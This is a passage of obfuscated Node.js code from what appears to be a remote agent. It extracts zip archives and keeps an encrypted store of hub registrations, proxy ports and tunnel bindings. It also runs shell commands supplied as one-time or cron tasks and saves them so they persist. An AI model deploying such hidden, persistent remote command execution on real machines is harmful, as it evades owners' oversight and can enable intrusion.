                            'status': d[gn(0x2e4)],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m['isDirectory']()) {
                        const p = a0o[gn(0x2ed)](l), q = (r, s) => {
                                const go = gn;
                                for (const t of a0l[go(0x849)](r)) {
                                    const u = a0o[go(0x782)](r, t), v = s ? ''[go(0x7b6)](s, '/')[go(0x7b6)](t) : t, w = a0l[go(0x9a5)](u);
                                    if (w['isDirectory']()) {
                                        if (!g[go(0x6b6)](''[go(0x7b6)](v, '/'), Buffer[go(0xacf)](0x0), w[go(0x7a7)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d['CKWPM'](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[go(0xdf2)]()) {
                                            if (!g[go(0x6b6)](v, a0l[go(0x902)](u), w[go(0x7a7)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d[gn(0x7cd)](q, l, c ? '' : p);
                    } else {
                        h[gn(0x59a)]({
                            'item': k,
                            'status': d[gn(0xe64)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[gn(0x59a)]({
                        'item': k,
                        'status': d[gn(0xb46)],
                        'added': n
                    });
                    continue;
                }
                i += n, h[gn(0x59a)]({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[gn(0x59a)]({
                    'item': k,
                    'status': d[gn(0xe64)],
                    'added': 0x0
                });
            }
        }
        return g[gn(0xd81)](), {
            'status': 'ok',
            'path': a0aM[gn(0x8b6)](f),
            'entries': i,
            'size': a0l[gn(0x7d2)](f) ? a0l['statSync'](f)[gn(0xd76)] : 0x0,
            'results': h
        };
    }
    static async [a0d0(0xc7c)](a, b, c = !![], d = null) {
        const gp = a0d0, f = {
                'eypyy': gp(0xc4b),
                'HvcvJ': function (p, q) {
                    return p(q);
                },
                'EBmcL': gp(0xa5b),
                'RgZPI': function (p, q) {
                    return p >= q;
                },
                'VkGnI': function (p, q) {
                    return p + q;
                },
                'acbsh': function (p, q) {
                    return p >= q;
                },
                'OeMMU': function (p, q) {
                    return p > q;
                },
                'lqRjL': function (p, q) {
                    return p + q;
                },
                'ORGFB': function (p, q) {
                    return p !== q;
                },
                'psBFw': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f[gp(0xe01)]);
        const g = a0o[gp(0x983)](a0ax[gp(0x45b)], a);
        if (!f[gp(0x3ae)](a0aK, g))
            throw new Error(f[gp(0x817)]);
        if (!a0l[gp(0x7d2)](g))
            throw new Error(gp(0x167)[gp(0x7b6)](a));
        if (a0l[gp(0x9a5)](g)[gp(0xa43)]())
            throw new Error(gp(0xd2a)['concat'](a));
        let h;
        if (b) {
            h = a0o['resolve'](a0ax[gp(0x45b)], b);
            if (!a0aK(h))
                throw new Error(f[gp(0x817)]);
            if (a0l['existsSync'](h) && !a0l['statSync'](h)[gp(0xa43)]())
                throw new Error(gp(0x239)['concat'](b));
        } else
            h = a0o[gp(0x6af)](g);
        a0l[gp(0x7ac)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0aL[gp(0x766)](g);
        } catch (p) {
            throw new Error(gp(0x60b)[gp(0x7b6)](a));
        }
        const j = (d || [])['filter'](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[gp(0x8f6)])
                continue;
            if (f[gp(0xe22)](f[gp(0xa73)](k, l), a0aL['ZIP_MAX_ENTRIES']) || f[gp(0x6e6)](m, a0aL[gp(0xe83)])) {
                l++;
                continue;
            }
            const r = q['name']['replace'](/\\/g, '/');
            if (j[gp(0x615)]) {
                const v = r[gp(0xc0)]('/')['pop']();
                if (!j[gp(0xd32)](r) && !j['includes'](v)) {
                    l++;
                    continue;
                }
            }
            if (q[gp(0x221)] || q['zip64'] || f[gp(0x31e)](f[gp(0x701)](m, q[gp(0xd76)]), a0aL[gp(0xe83)])) {
                l++;
                continue;
            }
            const s = a0o[gp(0x983)](h, r), t = a0o['relative'](h, s);
            if (t[gp(0x46a)]('..') || a0o['isAbsolute'](t)) {
                l++;
                continue;
            }
            if (!f[gp(0x3ae)](a0aK, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0aL['inflate'](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f['ORGFB'](a0aL['_crc32'](u), q[gp(0x28a)])) {
                l++;
                continue;
            }
            if (!c && a0l['existsSync'](s)) {
                l++;
                continue;
            }
            try {
                a0l[gp(0x7ac)](a0o[gp(0x6af)](s), { 'recursive': !![] }), a0l[gp(0x8e8)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[gp(0xd76)], f[gp(0x881)](n[gp(0x615)], a0aL['ZIP_MAX_LISTED_FILES']) ? n['push'](a0aM[gp(0x8b6)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0aM[gp(0x8b6)](g),
            'dest': a0aM['_displayPath'](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0aN {
    static [a0d0(0xb7c)] = a0d0(0xe53);
    static ['VERSION'] = 0x1;
    static [a0d0(0xb3d)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null,
        'hubregs': [],
        'proxyports': {
            'hub': [],
            'local': []
        },
        'argobinds': []
    };
    static [a0d0(0x22f)]() {
        const gq = a0d0;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[gq(0x7d2)](a))
                return a;
        }
        try {
            return a0p[gq(0x8d1)]() || process['cwd']();
        } catch (b) {
            return process['cwd']();
        }
    }
    static [a0d0(0x547)](a) {
        const gr = a0d0, b = { 'CUCVb': gr(0xaef) };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/['test'](a)) {
                const d = Buffer['from'](a, b[gr(0x4f4)]);
                return d[gr(0x615)] === 0x20 ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/['test'](a))
                return null;
            const c = Buffer[gr(0x58d)](a, gr(0xc75));
            return c[gr(0x615)] === 0x20 ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0d0(0x676)]() {
        const gs = a0d0, a = {
                'Fkkie': 'off',
                'ovrPM': gs(0xbbc),
                'NfUNh': gs(0xa35),
                'qIbhq': gs(0x247),
                'FNfsK': gs(0x668),
                'EpWib': gs(0x5f8)
            }, b = a0aN[gs(0xb3d)];
        let c = (process.env.KSTORE || '')[gs(0x27f)]();
        if ([
                a[gs(0xb27)],
                '0',
                a[gs(0x610)],
                a['NfUNh']
            ]['includes'](c[gs(0x777)]()))
            return a0R['info'](gs(0xb0b)), b;
        const d = (process.env.KSTORE_KEY || '')[gs(0x27f)]();
        !c && (c = a0o[gs(0x782)](a0aN[gs(0x22f)](), a[gs(0xe59)], a[gs(0x379)]));
        const f = a0aN[gs(0x547)](d);
        if (!f) {
            if (d)
                a0R[gs(0x755)](a[gs(0xd96)]);
            else
                a0R['info']('[TaskStore]\x20💾\x20KSTORE_KEY\x20未设置,\x20任务持久化未启用');
            return b;
        }
        return b[gs(0xda2)] = c, b[gs(0xd79)] = f, b['enabled'] = !![], a0R[gs(0x6e3)](gs(0x959)[gs(0x7b6)](b[gs(0xda2)])), b;
    }
    static ['encrypt'](a, b) {
        const gt = a0d0, c = {
                'dYNHf': gt(0xb0),
                'RoNXB': gt(0x132),
                'Zrpbe': gt(0xc75)
            }, d = a0k[gt(0x91e)](0xc), f = a0k[gt(0xa1c)](c['dYNHf'], a, d), g = Buffer['concat']([
                f[gt(0xaf5)](Buffer[gt(0x58d)](b, c[gt(0x5f3)])),
                f[gt(0xd42)]()
            ]), h = {
                'nonce': d[gt(0xa27)](c[gt(0xcb9)]),
                'tag': f[gt(0x71d)]()[gt(0xa27)](gt(0xc75)),
                'ciphertext': g[gt(0xa27)](c['Zrpbe'])
            };
        return Buffer[gt(0x58d)](JSON[gt(0xbbe)](h), c['RoNXB'])[gt(0xa27)](gt(0xc75));
    }
    static [a0d0(0xeb3)](a, b) {
        const gu = a0d0, c = {
                'azTtM': gu(0x6f9),
                'NcDCW': gu(0xb0),
                'IdFns': gu(0xc75),
                'keHvy': gu(0x132)
            }, d = JSON[gu(0x766)](Buffer[gu(0x58d)](b, gu(0xc75))['toString']('utf8'));
        if (!d[gu(0xd8)] || !d[gu(0xafc)] || !d[gu(0xd5e)])
            throw new Error(c[gu(0xed7)]);
        const f = a0k[gu(0x75c)](c['NcDCW'], a, Buffer[gu(0x58d)](d[gu(0xd8)], c[gu(0x59b)]));
        return f['setAuthTag'](Buffer[gu(0x58d)](d['tag'], c['IdFns'])), Buffer[gu(0x7b6)]([
            f[gu(0xaf5)](Buffer[gu(0x58d)](d[gu(0xd5e)], c[gu(0x59b)])),
            f['final']()
        ])[gu(0xa27)](c[gu(0x5ca)]);
    }
    static [a0d0(0x804)]() {
        const gv = a0d0, a = {
                'ItEMm': function (c, d) {
                    return c === d;
                },
                'ZSnHF': gv(0xefa),
                'lDRkN': gv(0x132),
                'AvWQE': function (c, d) {
                    return c !== d;
                },
                'HdOyb': gv(0x896),
                'kurBw': function (c, d, f) {
                    return c(d, f);
                },
                'mgdWL': function (c, d) {
                    return c !== d;
                },
                'pcaCw': function (c, d) {
                    return c(d);
                }
            }, b = a0aN['state'];
        b[gv(0xee1)] = [], b[gv(0x8e1)] = {
            'hub': [],
            'local': []
        }, b[gv(0xed2)] = [];
        if (!b[gv(0xbe3)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[gv(0x7d2)](b[gv(0xda2)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[gv(0x902)](b[gv(0xda2)], a['lDRkN'])[gv(0x27f)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[gv(0x766)](a0aN['decrypt'](b[gv(0xd79)], c));
            } catch (l) {
                throw new Error('解密失败\x20(密钥错误或数据被篡改):\x20'[gv(0x7b6)](l[gv(0xf18)]));
            }
            if (!d || a[gv(0x781)](d[gv(0xde3)], a0aN[gv(0xb7c)]))
                throw new Error(a[gv(0xc5e)]);
            const f = a[gv(0x41c)](parseInt, d[gv(0x794)], 0xa) || 0x0;
            if (f > a0aN['VERSION'])
                return b['locked'] = !![], a0R['error'](gv(0x990)['concat'](f, gv(0x2c0))[gv(0x7b6)](a0aN[gv(0xe80)], gv(0x34f))), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['mgdWL'](f, a0aN[gv(0xe80)]))
                throw new Error('不支持的版本\x20'['concat'](f));
            const g = d['data'] || {};
            b[gv(0x934)] = d[gv(0x66e)] || null;
            const h = Array['isArray'](g['onetasks']) ? g['onetasks'][gv(0x9c5)](String) : [], i = {};
            for (const [m, n] of Object[gv(0x471)](g[gv(0xb71)] || {}))
                i[String(m)] = a[gv(0x2ce)](String, n);
            b['hubregs'] = (Array['isArray'](g['hubregs']) ? g[gv(0xee1)] : [])['filter'](o => o && typeof o[gv(0x4bc)] === 'string' && typeof o[gv(0x973)] === 'string')[gv(0x9c5)](o => ({
                'hub': o[gv(0x4bc)],
                'kname': o['kname'],
                'ports': Array[gv(0x5f9)](o['ports']) ? o['ports'][gv(0x74d)](q => Number['isInteger'](q) && q >= 0x1 && q <= 0xffff) : []
            }));
            const j = o => (Array[gv(0x5f9)](o) ? o : [])[gv(0x74d)](q => Number[gv(0x3f2)](q) && q >= 0x1 && q <= 0xffff);
            return g[gv(0x8e1)] && !Array[gv(0x5f9)](g[gv(0x8e1)]) ? b['proxyports'] = {
                'hub': j(g[gv(0x8e1)][gv(0x4bc)]),
                'local': j(g[gv(0x8e1)][gv(0x88e)])
            } : b[gv(0x8e1)] = {
                'hub': [],
                'local': a['pcaCw'](j, g['proxyports'])
            }, b[gv(0xed2)] = (Array['isArray'](g[gv(0xed2)]) ? g[gv(0xed2)] : [])[gv(0x74d)](o => o && typeof o[gv(0xe77)] === gv(0xefa) && o[gv(0xe77)] && Number[gv(0x3f2)](o[gv(0x606)]) && o['port'] >= 0x1 && o['port'] <= 0xffff)[gv(0x9c5)](o => {
                const gw = gv, p = {
                        'port': o[gw(0x606)],
                        'name': o[gw(0xe77)]
                    };
                if (a[gw(0xdd9)](typeof o[gw(0xd79)], a[gw(0xe8)]) && o[gw(0xd79)])
                    p['key'] = o[gw(0xd79)];
                return p;
            }), a0R[gv(0x6e3)]('[TaskStore]\x20💾\x20已恢复持久化任务:\x20onetime='['concat'](h[gv(0x615)], gv(0xc3f))[gv(0x7b6)](Object[gv(0x30b)](i)['length'], gv(0xa55))[gv(0x7b6)](b[gv(0xee1)]['length'], ',\x20proxyport(hub)=')[gv(0x7b6)](b[gv(0x8e1)][gv(0x4bc)][gv(0x615)], gv(0xe0c))[gv(0x7b6)](b[gv(0x8e1)]['local'][gv(0x615)], gv(0x67f))[gv(0x7b6)](b[gv(0xed2)][gv(0x615)])), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (o) {
            return a0aN[gv(0x21c)]('加载失败:\x20'[gv(0x7b6)](o['message'])), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static ['getHubregs']() {
        const gx = a0d0;
        return [...a0aN[gx(0xb3d)]['hubregs'] || []];
    }
    static ['saveHubregs'](a) {
        const gy = a0d0, b = a0aN[gy(0xb3d)];
        if (!b[gy(0xbe3)] || b[gy(0x5dc)])
            return ![];
        return b[gy(0xee1)] = (a || [])[gy(0x74d)](c => c && c[gy(0x4bc)] && c['kname'])['map'](c => ({
            'hub': String(c[gy(0x4bc)]),
            'kname': String(c[gy(0x973)]),
            'ports': (c[gy(0x7f0)] || [])[gy(0x74d)](d => Number[gy(0x3f2)](d) && d >= 0x1 && d <= 0xffff)
        })), a0aN[gy(0xa49)](a0ax[gy(0xca5)], a0ax[gy(0xb71)]);
    }
    static [a0d0(0x549)]() {
        const gz = a0d0, a = a0aN[gz(0xb3d)][gz(0x8e1)] || {};
        return {
            'hub': [...a[gz(0x4bc)] || []],
            'local': [...a[gz(0x88e)] || []]
        };
    }
    static [a0d0(0xdd)](a) {
        const gA = a0d0, b = {
                'Mvpnx': function (f, g) {
                    return f === g;
                },
                'EWqIy': 'boolean',
                'NQCTO': function (f, g) {
                    return f(g);
                },
                'vdMdj': function (f, g) {
                    return f < g;
                },
                'fwCyp': function (f, g) {
                    return f > g;
                },
                'BxRLr': function (f, g) {
                    return f(g);
                }
            }, c = a0aN[gA(0xb3d)];
        if (!c['enabled'] || c['locked'])
            return ![];
        const d = f => {
            const gB = gA, g = new Set();
            for (const h of f || []) {
                if (b[gB(0x110)](typeof h, b[gB(0xaa5)]))
                    continue;
                const i = b[gB(0x104)](Number, h);
                if (!Number['isInteger'](i) || b[gB(0x4d8)](i, 0x1) || b[gB(0x482)](i, 0xffff))
                    continue;
                g[gB(0x6b6)](i);
            }
            return [...g][gB(0xa25)]((j, k) => j - k);
        };
        return c[gA(0x8e1)] = a && !Array['isArray'](a) ? {
            'hub': d(a[gA(0x4bc)]),
            'local': b[gA(0x104)](d, a['local'])
        } : {
            'hub': [],
            'local': b[gA(0xad5)](d, a)
        }, a0aN[gA(0xa49)](a0ax[gA(0xca5)], a0ax[gA(0xb71)]);
    }
    static ['getArgobinds']() {
        const gC = a0d0;
        return (a0aN['state']['argobinds'] || [])[gC(0x9c5)](a => ({ ...a }));
    }
    static [a0d0(0xa5c)](a) {
        const gD = a0d0, b = {
                'PQCIQ': gD(0xefa),
                'DYOyS': function (d, f) {
                    return d(f);
                }
            }, c = a0aN[gD(0xb3d)];
        if (!c[gD(0xbe3)] || c[gD(0x5dc)])
            return ![];
        return c[gD(0xed2)] = (a || [])[gD(0x74d)](d => d && d[gD(0xe77)] && Number[gD(0x3f2)](d[gD(0x606)]) && d[gD(0x606)] >= 0x1 && d[gD(0x606)] <= 0xffff)[gD(0x9c5)](d => {
            const gE = gD, f = {
                    'port': d[gE(0x606)],
                    'name': String(d[gE(0xe77)])
                };
            if (typeof d[gE(0xd79)] === b['PQCIQ'] && d[gE(0xd79)])
                f[gE(0xd79)] = b[gE(0x65e)](String, d['key']);
            return f;
        }), a0aN[gD(0xa49)](a0ax[gD(0xca5)], a0ax[gD(0xb71)]);
    }
    static [a0d0(0x21c)](a) {
        const gF = a0d0;
        try {
            const b = a0aN[gF(0xb3d)];
            if (b[gF(0xda2)] && a0l[gF(0x7d2)](b[gF(0xda2)])) {
                const c = ''[gF(0x7b6)](b[gF(0xda2)], gF(0xc88))[gF(0x7b6)](Date[gF(0x430)]());
                a0l[gF(0x334)](b[gF(0xda2)], c), a0R[gF(0x755)](gF(0x58e)['concat'](a, gF(0x5ba))[gF(0x7b6)](c));
            } else
                a0R[gF(0x755)]('[TaskStore]\x20❌\x20'[gF(0x7b6)](a));
        } catch (d) {
            a0R[gF(0x755)]('[TaskStore]\x20❌\x20'[gF(0x7b6)](a, gF(0xf0a))[gF(0x7b6)](d['message']));
        }
    }
    static [a0d0(0xa49)](a, b) {
        const gG = a0d0, c = a0aN['state'];
        if (!c['enabled'] || c[gG(0x5dc)])
            return ![];
        let d = null;
        try {
            const f = {
                    'magic': a0aN[gG(0xb7c)],
                    'version': a0aN['VERSION'],
                    'saved_at': new Date()[gG(0xdac)]()[gG(0xde0)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {},
                        'hubregs': c[gG(0xee1)] || [],
                        'argobinds': c[gG(0xed2)] || [],
                        'proxyports': c[gG(0x8e1)] || {
                            'hub': [],
                            'local': []
                        }
                    }
                }, g = a0aN['encrypt'](c['key'], JSON[gG(0xbbe)](f));
            return a0l[gG(0x7ac)](a0o[gG(0x6af)](c[gG(0xda2)]), { 'recursive': !![] }), d = ''['concat'](c[gG(0xda2)], '.tmp-')[gG(0x7b6)](process['pid']), a0l['writeFileSync'](d, g, gG(0x132)), a0l['renameSync'](d, c['path']), c[gG(0x934)] = f[gG(0x66e)], !![];
        } catch (h) {
            a0R['error'](gG(0xa96)[gG(0x7b6)](h[gG(0xf18)]));
            try {
                if (d && a0l[gG(0x7d2)](d))
                    a0l[gG(0xa78)](d);
            } catch (i) {
            }
            return ![];
        }
    }
}
class a0aO {
    static ['cronJobs'] = new Map();
    static ['_appendLog'](a, b) {
        const gH = a0d0, c = {
                'iuDBq': function (d, f) {
                    return d > f;
                },
                'PbuLp': function (d, f) {
                    return d - f;
                }
            };
        a[gH(0x59a)](b), c['iuDBq'](a[gH(0x615)], a0ax[gH(0x2c2)]) && a[gH(0x918)](0x0, c[gH(0xa76)](a[gH(0x615)], a0ax[gH(0x2c2)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const gI = a0d0, g = new Date()[gI(0xdac)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': ''[gI(0x7b6)](g, '\x20----\x20')['concat'](a, gI(0x3ec))['concat'](c, '\x0a')[gI(0x7b6)](b?.['trim']() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const gJ = a0d0;
        return {
            'status': 'ok',
            'count': a0ax[gJ(0xca5)][gJ(0x615)],
            'tasks': a0ax[gJ(0xca5)]
        };
    }
    static [a0d0(0x8e5)] = /^\s*(?:#|rem\b)\s*kisama-task:\s*(.*)$/i;
    static [a0d0(0x3be)](a) {
        const gK = a0d0, b = {
                'tcAHK': function (d, f) {
                    return d(f);
                },
                'XkioI': function (d, f) {
                    return d ?? f;
                },
                'mCNek': function (d, f) {
                    return d(f);
                }
            }, c = b['tcAHK'](String, b[gK(0x7bf)](a, ''))[gK(0xc0)]('\x0a')[gK(0x174)](0x0, 0x3);
        for (const d of c) {
            const f = a0aO['taskMetaLineRe'][gK(0x164)](d);
            if (!f)
                continue;
            const g = /\bid=(\d+)\b/[gK(0x164)](f[0x1])?.[0x1];
            if (!g)
                return null;
            const h = b[gK(0x560)](Number, /\bupdated=(\d+)\b/['exec'](f[0x1])?.[0x1] || 0x0);
            return {
                'id': g,
                'updated': h
            };
        }
        return null;
    }
    static ['stripTaskMetaLine'](a) {
        const gL = a0d0, b = {
                'QEpFb': function (d, f) {
                    return d(f);
                },
                'ndQJO': function (d, f) {
                    return d ?? f;
                },
                'uDMKP': function (d, f) {
                    return d + f;
                },
                'WtkFz': function (d, f) {
                    return d(f);
                }
            }, c = b[gL(0x38a)](String, b[gL(0x29d)](a, ''))[gL(0xc0)]('\x0a');
        for (let d = 0x0; d < Math['min'](0x3, c[gL(0x615)]); d++) {
            if (a0aO[gL(0x8e5)][gL(0xdbb)](c[d]))
                return [
                    ...c[gL(0x174)](0x0, d),
                    ...c[gL(0x174)](b[gL(0xda)](d, 0x1))
                ][gL(0x782)]('\x0a');
        }
        return b['WtkFz'](String, a ?? '');
    }
    static ['withTaskMeta'](a, b, c) {
        const gM = a0d0, d = {
                'qudHV': function (j, k) {
                    return j === k;
                },
                'bWMLJ': gM(0xb9a),
                'upgsb': 'rem'
            }, f = a0aO['stripTaskMetaLine'](a), g = d[gM(0xcb8)](process['platform'], d['bWMLJ']) ? d[gM(0x642)] : '#', h = ''['concat'](g, gM(0xbba))[gM(0x7b6)](b, '\x20updated=')[gM(0x7b6)](c), i = f[gM(0xc0)]('\x0a');
        return i[gM(0x918)](i[0x0]?.['startsWith']('#!') ? 0x1 : 0x0, 0x0, h), i[gM(0x782)]('\x0a');
    }
    static ['normalizeOnetimeTasks'](a, b) {
        const gN = a0d0, c = {
                'RUAbh': function (j, k) {
                    return j < k;
                },
                'gbGaR': function (j, k) {
                    return j < k;
                },
                'DhFes': function (j, k) {
                    return j(k);
                },
                'kiAgh': function (j, k) {
                    return j === k;
                },
                'jSvrl': function (j, k) {
                    return j(k);
                },
                'KmopD': function (j, k) {
                    return j(k);
                }
            }, d = Date[gN(0x430)](), f = j => (j || [])[gN(0x9c5)](k => ({
                'raw': String(k ?? ''),
                'meta': a0aO['parseTaskMeta'](k),
                'eff': a0aO[gN(0xd69)](k)[gN(0x27f)]()
            })), g = f(b), h = new Set(), i = [];
        for (const {
                    raw: j,
                    meta: k,
                    eff: l
                } of f(a)) {
            let m = -0x1;
            k && (m = g[gN(0xd1c)]((p, q) => !h[gN(0xbe6)](q) && p[gN(0x1c7)] && p[gN(0x1c7)]['id'] === k['id']));
            c[gN(0xc61)](m, 0x0) && (m = g[gN(0xd1c)]((p, q) => !h[gN(0xbe6)](q) && p['eff'] === l && (!k || !p[gN(0x1c7)])));
            if (c[gN(0xff)](m, 0x0)) {
                i[gN(0x59a)](a0aO['withTaskMeta'](l, c[gN(0xe3a)](String, d), d));
                continue;
            }
            const n = g[m];
            h[gN(0x6b6)](m);
            if (c[gN(0x385)](n[gN(0xec4)], l)) {
                n[gN(0x1c7)] ? i[gN(0x59a)](a0aO[gN(0xa2a)](n['raw'], n[gN(0x1c7)]['id'], n[gN(0x1c7)]['updated'])) : i[gN(0x59a)](a0aO[gN(0xa2a)](n[gN(0x209)], k ? k['id'] : c[gN(0x9de)](String, d), k && k['updated'] ? k[gN(0x8d4)] : d));
                continue;
            }
            const o = n[gN(0x1c7)] ? n[gN(0x1c7)]['id'] : k ? k['id'] : c[gN(0xb18)](String, d);
            i['push'](a0aO[gN(0xa2a)](l, o, d));
        }
        return i;
    }
    static [a0d0(0xc94)](a, b) {
        const gO = a0d0, c = {
                'uKDRR': function (j, k) {
                    return j < k;
                },
                'yAcSc': function (j, k) {
                    return j === k;
                },
                'XSeAA': function (j, k) {
                    return j(k);
                }
            }, d = Date['now'](), f = ([j, k]) => ({
                'expr': String(j),
                'raw': String(k ?? ''),
                'meta': a0aO[gO(0x3be)](k),
                'eff': a0aO['stripTaskMetaLine'](k)[gO(0x27f)]()
            }), g = Object[gO(0x471)](b || {})['map'](f), h = new Set(), i = {};
        for (const {
                    expr: j,
                    raw: k,
                    meta: l,
                    eff: m
                } of Object[gO(0x471)](a || {})[gO(0x9c5)](f)) {
            let n = -0x1;
            l && (n = g[gO(0xd1c)]((q, r) => !h['has'](r) && q['meta'] && q[gO(0x1c7)]['id'] === l['id']));
            c[gO(0x758)](n, 0x0) && (n = g['findIndex']((q, r) => !h[gO(0xbe6)](r) && q[gO(0x330)] === j && q[gO(0xec4)] === m && (!l || !q[gO(0x1c7)])));
            if (n < 0x0) {
                i[j] = a0aO[gO(0xa2a)](m, String(d), d);
                continue;
            }
            const o = g[n];
            h[gO(0x6b6)](n);
            if (c[gO(0x62a)](o[gO(0xec4)], m) && c['yAcSc'](o[gO(0x330)], j)) {
                o[gO(0x1c7)] ? i[j] = a0aO[gO(0xa2a)](o[gO(0x209)], o[gO(0x1c7)]['id'], o[gO(0x1c7)][gO(0x8d4)]) : i[j] = a0aO['withTaskMeta'](o[gO(0x209)], l ? l['id'] : c[gO(0xd2e)](String, d), l && l['updated'] ? l[gO(0x8d4)] : d);
                continue;
            }
            const p = o[gO(0x1c7)] ? o[gO(0x1c7)]['id'] : l ? l['id'] : c[gO(0xd2e)](String, d);
            i[j] = a0aO[gO(0xa2a)](m, p, d);
        }
        return i;
    }
    static async [a0d0(0xc99)](a) {
        const gP = a0d0, b = {
                'BQNkj': gP(0x2a4),
                'KzuBZ': function (d, f) {
                    return d > f;
                },
                'MAhUu': function (d, f) {
                    return d < f;
                },
                'ODdlm': gP(0x8a3)
            };
        if (!Array[gP(0x5f9)](a)) {
            const d = new Error(b[gP(0xda0)]);
            d[gP(0xab3)] = 0x190;
            throw d;
        }
        a0ax['onetasks'] = a && b[gP(0x4f0)](a[gP(0x615)], 0x0) ? a0aO[gP(0x7d9)](a, a0ax[gP(0xca5)]) : [];
        const c = [];
        if (a0ax[gP(0x158)] && a0ax[gP(0xca5)][gP(0x615)] > 0x0) {
            for (let f = 0x0; b[gP(0x3c5)](f, a0ax['onetasks'][gP(0x615)]); f++) {
                const g = a0ax[gP(0xca5)][f], h = await a0aJ[gP(0xc06)](g), j = this[gP(0x2a5)](g, h['result'], h[gP(0xa51)], b[gP(0xd4d)]);
                this[gP(0x9f4)](a0ax[gP(0xbed)], j), c[gP(0x59a)]({
                    'index': f,
                    'cmd': g,
                    'exitcode': h['exitcode'],
                    'output': h['result'],
                    'status': h[gP(0xa51)] === 0x0 ? 'ok' : gP(0x755)
                });
            }
            a0ax[gP(0x158)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0ax[gP(0xca5)][gP(0x615)],
            'tasks': a0ax[gP(0xca5)],
            'executed': c,
            'persisted': a0aN[gP(0xa49)](a0ax['onetasks'], a0ax['crontasks'])
        };
    }
    static [a0d0(0xf10)]() {
        const gQ = a0d0;
        return {
            'status': 'ok',
            'count': Object[gQ(0x30b)](a0ax[gQ(0xb71)])[gQ(0x615)],
            'tasks': a0ax[gQ(0xb71)]
        };
    }
    static ['setCronTasks'](a) {
        const gR = a0d0, b = {
                'ruNMI': function (d, f) {
                    return d === f;
                },
                'qpqnd': gR(0x6c3),
                'uBTjz': function (d, f) {
                    return d > f;
                },
                'iSCLZ': gR(0x755),
                'zjXzq': function (d, f) {
                    return d - f;
                },
                'DlekY': function (d, f) {
                    return d > f;
                }
            };
        this[gR(0xa06)][gR(0xd36)](d => {
            const gS = gR;
            b[gS(0xb43)](typeof d[gS(0x7ef)], b['qpqnd']) && d['stop'](), b[gS(0xb43)](typeof d['destroy'], b[gS(0xbc6)]) && d[gS(0x4d7)]();
        }), this[gR(0xa06)]['clear']();
        const c = [];
        for (const d of Object[gR(0x30b)](a || {})) {
            !a0t['validate'](d) && c[gR(0x59a)](d);
        }
        if (b['uBTjz'](c[gR(0x615)], 0x0))
            return {
                'status': b['iSCLZ'],
                'message': gR(0xd5a)[gR(0x7b6)](c[gR(0x782)](',\x20')),
                'valid_count': b[gR(0x773)](Object[gR(0x30b)](a || {})['length'], c[gR(0x615)])
            };
        a0ax[gR(0xb71)] = a && Object['keys'](a)[gR(0x615)] > 0x0 ? a0aO[gR(0xc94)](a, a0ax[gR(0xb71)]) : {};
        for (const [f, g] of Object[gR(0x471)](a0ax['crontasks'])) {
            const h = a0t[gR(0xe41)](f, async () => {
                const gT = gR, i = await a0aJ[gT(0xc06)](g), j = this[gT(0x2a5)](g, i[gT(0x729)], i['exitcode'], gT(0xbfe), f);
                this[gT(0x9f4)](a0ax[gT(0x54a)], j);
            });
            this[gR(0xa06)]['set'](f, h);
        }
        return a0ax[gR(0xe75)] = b['DlekY'](Object[gR(0x30b)](a0ax[gR(0xb71)])[gR(0x615)], 0x0), {
            'status': 'ok',
            'count': Object[gR(0x30b)](a0ax[gR(0xb71)])[gR(0x615)],
            'tasks': a0ax[gR(0xb71)],
            'persisted': a0aN[gR(0xa49)](a0ax[gR(0xca5)], a0ax['crontasks'])
        };
    }
    static [a0d0(0x7ca)]() {
        const gU = a0d0;
        return {
            'onetime': {
                'pending': a0ax[gU(0x158)],
                'count': a0ax[gU(0xca5)][gU(0x615)]
            },
            'cron': {
                'active': a0ax['cronloop'],
                'count': Object[gU(0x30b)](a0ax[gU(0xb71)])[gU(0x615)],
                'check_interval': a0ax[gU(0xe27)]
            },
            'persistence': {
                'enabled': a0aN['state'][gU(0xbe3)],
                'store_path': a0aN[gU(0xb3d)][gU(0xda2)],
                'last_saved_at': a0aN[gU(0xb3d)][gU(0x934)]
            }
        };
    }
    static [a0d0(0x3ef)](a = 0x32) {
        const gV = a0d0, b = a0ax['onetimetasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b[gV(0x615)],
            'logs': b
        };
    }
    static [a0d0(0xd92)](a = 0x32) {
        const gW = a0d0, b = a0ax[gW(0x54a)]['slice'](-a);
        return {
            'status': 'ok',
